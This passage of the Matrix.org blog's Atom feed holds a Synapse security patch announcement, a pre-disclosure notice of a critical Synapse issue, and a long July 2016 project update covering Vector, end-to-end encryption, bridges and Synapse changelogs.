&lt;p&gt;The patch against v0.16.x is: &lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;07&#x2F;sec-0.16.patch_.txt&quot;&gt;sec-0.16.patch&lt;&#x2F;a&gt;, &lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;07&#x2F;sec-0.16.patch_.signed.txt&quot;&gt;sec-0.16.patch.signed&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The patch against v0.14.x is: &lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;07&#x2F;sec-0.14.patch_.txt&quot;&gt;sec-0.14.patch&lt;&#x2F;a&gt;, &lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;07&#x2F;sec-0.14.patch_.signed.txt&quot;&gt;sec-0.14.patch.signed&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Signed announcement: &lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;07&#x2F;fulldisclosure.signed.txt&quot;&gt;fulldisclosure.signed&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Pre-Disclosure: Critical Security Issue in Synapse</title>
        <published>2016-07-07T00:00:00+00:00</published>
        <updated>2016-07-07T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2016/07/07/pre-disclosure-critical-security-issue-in-synapse/" type="text/html"/>
        <id>https://matrix.org/blog/2016/07/07/pre-disclosure-critical-security-issue-in-synapse/</id>
        
        <content type="html">&lt;p&gt;We have recently been made aware of a critical security issue in Synapse. Full disclosure of the issue and patch will be made at 2016-07-08 13:00 UTC. We are coordinating with package maintainers to ensure that patched versions of the packages will be available at that time.&lt;&#x2F;p&gt;
&lt;p&gt;If you run your own Synapse please be prepared to upgrade as soon as the patched versions are released.&lt;&#x2F;p&gt;
&lt;p&gt;Thank you for your time, patience and understanding while we resolve this issue,
The Matrix Team&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;07&#x2F;predisclosure.signed.txt&quot;&gt;Signed pre-disclosure notice&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>The Matrix Summer Special!!</title>
        <published>2016-07-04T00:00:00+00:00</published>
        <updated>2016-07-04T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2016/07/04/the-matrix-summer-special/" type="text/html"/>
        <id>https://matrix.org/blog/2016/07/04/the-matrix-summer-special/</id>
        
        <content type="html">&lt;p&gt;Hi folks - another few months have gone by and once again the core Matrix team has ended up too busy hacking away on the final missing pieces of the Matrix jigsaw puzzle to have been properly updating the blog; sorry about this. The end is in sight for the current crunch however, and we expect to return to regular blog updates shortly! Meanwhile, rather than letting news stack up any further, here&#x27;s a quick(?) attempt to summarise all the things which have been going on!&lt;&#x2F;p&gt;
&lt;h3 id=&quot;synapse-0-16-1-released&quot;&gt;Synapse 0.16.1 released!&lt;&#x2F;h3&gt;
&lt;p&gt;This one&#x27;s a biggy: in the mad rush during June to support the public debut for &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&quot;&gt;Vector&lt;&#x2F;a&gt;, we made a series of major &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&quot;&gt;Synapse&lt;&#x2F;a&gt; releases which apparently we forgot to tell anyone about (sorry!). The full changelog is at the bottom of the post as it&#x27;s huge, but the big features are:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Huge performance improvements, including adding write-thru event caches and improving caching throughout, and massive improvements to the speed of the room directory API.&lt;&#x2F;li&gt;
 	&lt;li&gt;Add support for inline URL previewing!&lt;&#x2F;li&gt;
 	&lt;li&gt;Add email notifications!&lt;&#x2F;li&gt;
 	&lt;li&gt;Add support for LDAP authentication (thanks to Christoph Witzany)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add support for JWT authentication (thanks to Niklas Riekenbrauck)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add basic server-side ignore functionality and abuse reporting API&lt;&#x2F;li&gt;
 	&lt;li&gt;Add ability to delegate &#x2F;publicRooms API requests to a list of secondary homeservers&lt;&#x2F;li&gt;
 	&lt;li&gt;Lots and lots and lots of bug fixes.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
If you haven&#x27;t upgraded, please do asap from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&lt;&#x2F;a&gt;!
&lt;p&gt;There&#x27;s also been a huge amount of work going on behind the scenes on horizontal scalability for Synapse.  We haven&#x27;t drawn much attention to this yet (or documented it) as it&#x27;s still quite experimental and in flux, but the main change is to add the concept of application-layer replication to Synapse - letting you split the codebase into multiple endpoints which can then be run in parallel, each replicating their state off the master synapse process.  For instance, right now the Matrix.org homeserver is actually running off three different processes: the main synapse; another specific to calculating push notifications and another specific to serving up the &#x2F;sync endpoint.  These three are then abstracted behind the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendron&quot;&gt;dendron&lt;&#x2F;a&gt; layer (which also implements the &#x2F;login endpoint). The idea is that one can then run multiple instances of the &#x2F;sync and pusher (and other future) endpoints to horizontally scale.  For now, they share a single database writer, but in practice this has improved our scalability and performance on the Matrix.org HS radically.&lt;&#x2F;p&gt;
&lt;p&gt;In future we&#x27;ll actually document how to run these, as well as making it easy to spin up multiple concurrent instances - in the interim if you find you&#x27;re hitting performance limits running high-traffic synapses come talk to us about it on &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#matrix-dev:matrix.org&quot;&gt;#matrix-dev:matrix.org&lt;&#x2F;a&gt;.  And the longer term plan continues to be to switch out these python endpoint implementations in future for more efficient implementations.  For instance, there&#x27;s a golang implementation of the media repository currently in development which could run as another endpoint cluster.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;vector-released&quot;&gt;Vector released!&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;@Vector&#x2F;2d33b23a787&quot;&gt;Much has been written&lt;&#x2F;a&gt; about this &lt;a href=&quot;https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=11871527&quot;&gt;elsewhere&lt;&#x2F;a&gt;, but Web, iOS and Android versions of the &lt;a href=&quot;https:&#x2F;&#x2F;www.vector.im&quot;&gt;Vector&lt;&#x2F;a&gt; clients were finally released to the general public on June 9th at the &lt;a href=&quot;http:&#x2F;&#x2F;www.decentralizedweb.net&#x2F;&quot;&gt;Decentralised Web Summit&lt;&#x2F;a&gt; in San Francisco.  Vector is a relatively thin layer on top of the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-react-sdk&quot;&gt;matrix-react-sdk&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-ios-sdk&quot;&gt;matrix-ios-sdk&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-android-sdk&quot;&gt;matrix-android-sdk&lt;&#x2F;a&gt; Matrix.org client SDKs which showcases Matrix&#x27;s collaboration and messaging capabilities in a mass-market usable app.  There&#x27;s been huge amounts of work here across the SDKs for the 3 platforms, with literally thousands of issues resolved.  You can find the full SDK changelogs on github for &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-react-sdk&#x2F;blob&#x2F;master&#x2F;CHANGELOG.md&quot;&gt;React&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-ios-kit&#x2F;blob&#x2F;master&#x2F;CHANGES.rst&quot;&gt;iOS&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-android-sdk&#x2F;blob&#x2F;master&#x2F;CHANGES.rst&quot;&gt;Android&lt;&#x2F;a&gt;.  Some of the more interesting recent additions to Vector include improved room notifications, URL previews, configurable email notifications, and huge amounts of performance stability work.&lt;&#x2F;p&gt;
&lt;p&gt;Future work on Vector is focused on showcasing end-to-end encryption, providing a one-click interface for adding bots&#x2F;integrations &amp;amp; bridges to a room, and generally enormously improving the UX and polish.  Meanwhile, there&#x27;s an F-Droid release for Android landing &lt;a href=&quot;https:&#x2F;&#x2F;f-droid.org&#x2F;repository&#x2F;browse&#x2F;?fdid=im.vector.alpha&quot;&gt;any day now&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;If you haven&#x27;t checked it out recently, it&#x27;s really worth a look :)&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;vector.im&quot;&gt;&lt;img class=&quot;aligncenter size-large wp-image-1658&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;07&#x2F;Screen-Shot-2016-07-04-at-12.18.10-1024x591.png&quot; alt=&quot;Vector&quot; width=&quot;1024&quot; height=&quot;591&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;matrix-spec-0-1-0&quot;&gt;Matrix Spec 0.1.0&lt;&#x2F;h3&gt;
&lt;p&gt;In case you didn&#x27;t notice, we also released &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&#x2F;&quot;&gt;v0.1.0 of the Matrix spec&lt;&#x2F;a&gt; itself in May - this is a fairly minor update which improves the layout of the document somewhat (thanks to a PR from Jimmy Cuadra) and a some bugfixes.  You can see the &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&#x2F;client_server&#x2F;r0.1.0.html#changelog&quot;&gt;full changelog here&lt;&#x2F;a&gt;. We&#x27;re overdue a new release since then (albeit again with relatively minor changes).&lt;&#x2F;p&gt;
&lt;h3 id=&quot;google-summer-of-code&quot;&gt;Google Summer of Code&lt;&#x2F;h3&gt;
&lt;p&gt;We&#x27;re in the middle of the second half of GSoC right now, with our GSoC students Aviral and Half-Shot hacking away on Vector and Microblogging projects respectively.  There&#x27;s a lot of exciting stuff coming out of this - Aviral contributing Rich Text Editing, Emoji autocompletion, DuckDuckGo and other features into Vector (currently on branches, but will be released soon) and Half-Shot building a Twitter bridge as part of his Matrix-powered microblogging system.  Watch this space for updates!&lt;&#x2F;p&gt;
&lt;h3 id=&quot;ruma&quot;&gt;Ruma&lt;&#x2F;h3&gt;
&lt;p&gt;Lots of exciting stuff has been happening recently over at &lt;a href=&quot;https:&#x2F;&#x2F;ruma.io&quot;&gt;Ruma.io&lt;&#x2F;a&gt; - an independent Matrix homeserver implementation written in Rust.  Over the last few weeks Jimmy and friends have got into the real meat of implementing e&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ruma&#x2F;ruma&#x2F;commit&#x2F;8a2fe269196dfd5b629c6e301e8d78e19ae6d279&quot;&gt;vents&lt;&#x2F;a&gt; and the core of the Matrix CS API, and as of the time of writing they&#x27;re the &lt;a href=&quot;https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=12028475&quot;&gt;topmost link&lt;&#x2F;a&gt; on HackerNews!  There&#x27;s a lot of work involved in writing a homeserver, but Ruma is looking incredibly promising and the feedback from their team has been incredibly helpful in keeping us honest on the Matrix spec and ensuring that it&#x27;s fit for purpose for 3rd party server implementers.&lt;&#x2F;p&gt;
&lt;p&gt;Also, Ruma just released some &lt;a href=&quot;https:&#x2F;&#x2F;www.ruma.io&#x2F;docs&#x2F;matrix&quot;&gt;truly excellent documentation&lt;&#x2F;a&gt; as a high-level introduction to Matrix (thanks to Leah and Jimmy) - much better than anything we have on the official Matrix.org site.  Go check it out if you haven&#x27;t already!&lt;&#x2F;p&gt;
&lt;h3 id=&quot;end-to-end-encryption&quot;&gt;End to End Encryption&lt;&#x2F;h3&gt;
&lt;p&gt;There has been &lt;em&gt;LOADS&lt;&#x2F;em&gt; of work happening on End to End encryption: finalising the core 1:1 &amp;quot;&lt;a href=&quot;&#x2F;git&#x2F;olm&quot;&gt;Olm&lt;&#x2F;a&gt;&amp;quot; cryptographic ratchet; implementing the group &amp;quot;&lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;git&#x2F;olm&#x2F;tree&#x2F;src&#x2F;megolm.c&quot;&gt;Megolm&lt;&#x2F;a&gt;&amp;quot; ratchet (which shares a single ratchet over all the participants of a room for scalability); fully hooking Olm into matrix-js-sdk and Vector-web at last, and preparing for a formal and published-to-the-public 3rd party security audit on Olm which will be happening during July.&lt;&#x2F;p&gt;
&lt;p&gt;This deserves a post in its own right, but the key thing to know is that Olm is almost ready - and indeed the work-in-progress E2E UX is even available on the &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&#x2F;develop&quot;&gt;develop branch of vector&lt;&#x2F;a&gt; if you enable E2E in the new &#x27;Labs&#x27; section in User Settings.  Olm itself is usable only for &#x27;burn after reading&#x27; strictly PFS messages, but Megolm integration with Vector &amp;amp; Synapse will follow shortly afterwards which will finally provide the E2E nirvana we&#x27;ve all been waiting for :)&lt;&#x2F;p&gt;
&lt;h3 id=&quot;decentralised-web-summit&quot;&gt;Decentralised Web Summit&lt;&#x2F;h3&gt;
&lt;p&gt;Matrix had a major presence as a sponsor at the first ever &lt;a href=&quot;http:&#x2F;&#x2F;www.decentralizedweb.net&#x2F;&quot;&gt;Decentralised Web Summit&lt;&#x2F;a&gt; hosted by the Internet Archive in San Francisco back in June.  This was a truly incredible event - with folks gathering from across the world to discuss, collaborate and debate on ensure that the web is not fragmented or trapped into proprietary silos - with the likes of Tim Berners-Lee, Vint Cerf and Brewster Kahle in attendance.  We ran a long 2 hour workshop on Matrix and showed off Vector to anyone and everyone - and meanwhile the organisers were kind enough to promote Matrix as the main decentralised chat interface for the conference itself (bridged with their Slack).  A full writeup of the conference really merits a blog post in its own right, but the punchline is that you could genuinely tell that this is the beginning of a new era of the internet - whether it&#x27;s using Merkle DAGs (like Matrix) or Blockchain or similar technologies: we are about to see a major shift in the balance of power on the internet back towards its users.&lt;&#x2F;p&gt;
&lt;p&gt;We strongly recommend checking out the videos which have all been published at &lt;a href=&quot;http:&#x2F;&#x2F;www.decentralizedweb.net&#x2F;&quot;&gt;Decentralised Web Summit&lt;&#x2F;a&gt;, including &lt;a href=&quot;https:&#x2F;&#x2F;archive.org&#x2F;details&#x2F;DWebSummit2016_Lightning_Talks_Session_B&quot;&gt;lightning talks introducing both Matrix and Vector&lt;&#x2F;a&gt;, and digging into as many of the projects advertised as possible.  It was particularly interesting for us to get to know Tim Berners-Lee&#x27;s latest project at MIT: &lt;a href=&quot;https:&#x2F;&#x2F;solid.mit.edu&#x2F;&quot;&gt;Solid&lt;&#x2F;a&gt; - which shares quite a lot of the same goals as Matrix, and subsequently seeing Tim pop up on &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&#x2F;develop&#x2F;#&#x2F;room&#x2F;#decentralizedweb-general:matrix.org&#x2F;$146549767249761pyAQF:matrix.org&quot;&gt;Matrix via Vector&lt;&#x2F;a&gt;.  We&#x27;re really looking forward to working out how Matrix &amp;amp; Solid can complement each other in future.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;parkan&#x2F;status&#x2F;740324969884700672&quot;&gt;&lt;img class=&quot;aligncenter wp-image-1660 size-large&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;07&#x2F;timbl-768x1024.jpg&quot; alt=&quot;Matthew, Tim Berners-Lee and Matrix&quot; width=&quot;384&quot; height=&quot;512&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;matrix-to&quot;&gt;Matrix.to&lt;&#x2F;h3&gt;
&lt;p&gt;Not the most exciting thing ever, but heads up that there&#x27;s a simple site up at &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&quot;&gt;https:&#x2F;&#x2F;matrix.to&lt;&#x2F;a&gt; to provide a way of doing client-agnostic links to content in Matrix.  For instance, rather than linking specifically into an app like Vector, you can now say &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#matrix:matrix.org&quot;&gt;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#matrix:matrix.org&lt;&#x2F;a&gt; to go there via whatever app you choose.  This is basically a bootstrapping process towards having proper mx:&#x2F;&#x2F; URLs in circulation, but given mx:&#x2F;&#x2F; doesn&#x27;t exist yet, https:&#x2F;&#x2F;matrix.to hopefully provides a useful step in the right direction :)&lt;&#x2F;p&gt;
&lt;p&gt;PRs very welcome at &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.to&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.to&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;bridges-and-bots&quot;&gt;Bridges and Bots&lt;&#x2F;h3&gt;
&lt;p&gt;Much of the promise of Matrix is the ability to bridge through to other silos, and we&#x27;ve been gradually adding more and more bridging capabilities in.&lt;&#x2F;p&gt;
&lt;p&gt;For instance, the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-irc&quot;&gt;IRC bridge&lt;&#x2F;a&gt; has had a complete overhaul to add in huge numbers of new features and finally deployed for Freenode a few weeks ago:&lt;&#x2F;p&gt;
&lt;p&gt;New Features:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Nicks set via &lt;code&gt;!nick&lt;&#x2F;code&gt; will now be preserved across bridge restarts.&lt;&#x2F;li&gt;
 	&lt;li&gt;EXPERIMENTAL: IRC clients created by the bridge can be assigned their own IPv6 address.&lt;&#x2F;li&gt;
 	&lt;li&gt;The bridge will now send connection status information to real Matrix users via the admin room (the same room &lt;code&gt;!nick&lt;&#x2F;code&gt;commands are issued).&lt;&#x2F;li&gt;
 	&lt;li&gt;Added &lt;code&gt;!help&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
 	&lt;li&gt;The bridge will now fallback to &lt;code&gt;body&lt;&#x2F;code&gt; if the HTML content contains &lt;em&gt;any&lt;&#x2F;em&gt; unrecognised tags. This makes passing Markdown from Matrix to IRC much nicer.&lt;&#x2F;li&gt;
 	&lt;li&gt;The bridge will now send more metrics to the statsd server, including the join&#x2F;part rate to and from IRC.&lt;&#x2F;li&gt;
 	&lt;li&gt;The config option &lt;code&gt;matrixClients.displayName&lt;&#x2F;code&gt; is now implemented.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Bug fixes:
&lt;ul&gt;
 	&lt;li&gt;Escape HTML entities when sending from IRC to Matrix. This prevents munging occurring between IRC formatting and textual &amp;lt; element &amp;gt; references, whereby if you sent a tag and some colour codes from IRC it would not escape the tag and therefore send invalid HTML to Matrix.&lt;&#x2F;li&gt;
 	&lt;li&gt;User IDs starting with &lt;code&gt;-&lt;&#x2F;code&gt; are temporarily filtered out from being bridged.&lt;&#x2F;li&gt;
 	&lt;li&gt;Deterministically generate the configuration file.&lt;&#x2F;li&gt;
 	&lt;li&gt;Recognise more IRC error codes as non-fatal to avoid IRC clients reconnecting unnecessarily.&lt;&#x2F;li&gt;
 	&lt;li&gt;Add a 10 second timeout to join events injected via the &lt;code&gt;MemberListSyncer&lt;&#x2F;code&gt; to avoid HOL blocking.&lt;&#x2F;li&gt;
 	&lt;li&gt;&#x27;Frontier&#x27; Matrix users will be forcibly joined to IRC channels even if membership list syncing I-&amp;gt;M is disabled. This ensures that there is always a Matrix user in the channel being bridged to avoid losing traffic.&lt;&#x2F;li&gt;
 	&lt;li&gt;Cache the &lt;code&gt;&#x2F;initialSync&lt;&#x2F;code&gt; request to avoid hitting this endpoint more than once, as it may be very slow.&lt;&#x2F;li&gt;
 	&lt;li&gt;Indexes have been added to the NeDB .db files to improve lookup times.&lt;&#x2F;li&gt;
 	&lt;li&gt;Do not recheck if the bridge bot should part the channel if a virtual user leaves the channel: we know it shouldn&#x27;t.&lt;&#x2F;li&gt;
 	&lt;li&gt;Refine what counts as a &quot;request&quot; for metrics, reducing the amount of double-counting as requests echo back from the remote side.&lt;&#x2F;li&gt;
 	&lt;li&gt;Fixed a bug which caused users to be provisioned off their &lt;code&gt;user_id&lt;&#x2F;code&gt; even if they had a display name set.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Meanwhile, a &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-gitter&quot;&gt;Gitter bridge&lt;&#x2F;a&gt; is in active development (and in testing with the Neovim community on Gitter&#x2F;Matrix&#x2F;Freenode), although lacking documentation so far.
&lt;p&gt;Finally, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;Matrix-NEB&quot;&gt;NEB&lt;&#x2F;a&gt; - the Matrix.org bot framework is currently being ported from Python to Golang to act as a general Go SDK for rapidly implementing new bot capabilities.&lt;&#x2F;p&gt;
&lt;p&gt;There&#x27;s little point in all of the effort going into bridges and bots if it&#x27;s too hard for normal users to deploy them, so on the Vector side of things there&#x27;s an ongoing project to build a commercial-grade bot&#x2F;bridge hosted service offering for Matrix which should make it &lt;em&gt;much&lt;&#x2F;em&gt; easier for non-sysadmins to quickly add their own bots and bridges into their rooms.  There&#x27;s nothing to see yet, but we&#x27;ll be yelling about it when it&#x27;s ready!&lt;&#x2F;p&gt;
&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;&#x2F;h3&gt;
&lt;p&gt;I&#x27;m sure there&#x27;s a lot of stuff missing from the quick summary above - suffice it to say that the Matrix ecosystem is growing so fast and so large that it&#x27;s pretty hard to keep track of everything that&#x27;s going on.  The big remaining blockers we see at this point are:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;End-to-end Encryption roll-out&lt;&#x2F;li&gt;
 	&lt;li&gt;Polishing UX on Vector - showing that it&#x27;s possible to build better-than-Slack quality UX on top of Matrix&lt;&#x2F;li&gt;
 	&lt;li&gt;Bots, Integrations and Bridges - making them absolutely trivial to build and deploy, and encouraging everyone to write as many as they can!&lt;&#x2F;li&gt;
 	&lt;li&gt;Improving VoIP, especially for conferencing, especially on Mobile&lt;&#x2F;li&gt;
 	&lt;li&gt;Threading&lt;&#x2F;li&gt;
 	&lt;li&gt;Editable messages&lt;&#x2F;li&gt;
 	&lt;li&gt;Synapse scaling and stability - this is massively improved, but there&#x27;s still work to be done.  Meanwhile projects like &lt;a href=&quot;https:&#x2F;&#x2F;ruma.io&quot;&gt;Ruma&lt;&#x2F;a&gt; give us hope for light at the end of the Synapse tunnel!&lt;&#x2F;li&gt;
 	&lt;li&gt;Spec refinements - there are still a &lt;a href=&quot;&#x2F;jira&#x2F;browse&#x2F;SPEC&quot;&gt;lot of open spec bugs&lt;&#x2F;a&gt; which we need to resolve so we can declare the spec (and thus Matrix!) out of beta.&lt;&#x2F;li&gt;
 	&lt;li&gt;More clients - especially desktop ones; helping out with &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Fxrh&#x2F;Quaternion&quot;&gt;Quaternion&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;davidar&#x2F;tensor&quot;&gt;Tensor&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;pto.im&quot;&gt;PTO&lt;&#x2F;a&gt;, etc.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
...and then all the pieces of the jigsaw will finally be in place, and Matrix should hopefully fulfil its potential as an invaluable, open and decentralised data fabric for the web.
&lt;p&gt;Thanks, once again, to everyone who&#x27;s been supporting and using Matrix - whether it&#x27;s by hanging out in the public chatrooms, running your own server, writing your own clients, bots, or servers, or just telling your friends about the project.  The end of the beginning is in sight: thanks for believing in us, and thank you for flying Matrix.&lt;&#x2F;p&gt;
&lt;p&gt;Matthew, Amandine &amp;amp; the Matrix Team.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;appendix-the-missing-synapse-changelogs&quot;&gt;Appendix: The Missing Synapse Changelogs&lt;&#x2F;h3&gt;
&lt;h3 id=&quot;changes-in-synapse-v0-16-1-2016-06-20&quot;&gt;Changes in synapse v0.16.1 (2016-06-20)&lt;&#x2F;h3&gt;
&lt;p&gt;Bug fixes:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Fix assorted bugs in &lt;code&gt;&#x2F;preview_url&lt;&#x2F;code&gt; (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;872&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;872&quot; data-id=&quot;160459814&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#872&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix TypeError when setting unicode passwords (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;873&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;873&quot; data-id=&quot;160576835&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#873&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Performance improvements:
&lt;ul&gt;
 	&lt;li&gt;Turn &lt;code&gt;use_frozen_events&lt;&#x2F;code&gt; off by default (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;877&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;877&quot; data-id=&quot;160897209&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#877&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Disable responding with canonical json for federation (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;878&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;878&quot; data-id=&quot;160910639&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#878&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;changes-in-synapse-v0-16-1-rc1-2016-06-15&quot;&gt;Changes in synapse v0.16.1-rc1 (2016-06-15)&lt;&#x2F;h3&gt;
&lt;p&gt;Features: None&lt;&#x2F;p&gt;
&lt;p&gt;Changes:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Log requester for &lt;code&gt;&#x2F;publicRoom&lt;&#x2F;code&gt; endpoints when possible (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;856&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;856&quot; data-id=&quot;159162802&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#856&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;502 on &lt;code&gt;&#x2F;thumbnail&lt;&#x2F;code&gt; when can&#x27;t connect to remote server (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;862&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;862&quot; data-id=&quot;159375931&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#862&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Linearize fetching of gaps on incoming events (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;871&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;871&quot; data-id=&quot;160433511&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#871&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Bugs fixes:
&lt;ul&gt;
